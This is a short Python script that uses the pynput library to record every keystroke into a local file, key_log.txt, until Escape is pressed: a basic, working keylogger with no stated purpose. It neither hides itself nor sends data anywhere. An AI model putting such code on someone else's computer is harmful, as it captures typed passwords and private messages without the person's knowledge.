from pynput.keyboard import Key, Listener

# Path to the log file
log_file = "key_log.txt"

# Function to write keystrokes to the log file
def on_press(key):
    with open(log_file, "a") as f:
        try:
            f.write(f'{key.char}')
        except AttributeError:
            if key == Key.space:
                f.write(' ')
            else:
                f.write(f'[{key}]')

# Function to handle key release
def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False

# Setting up the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
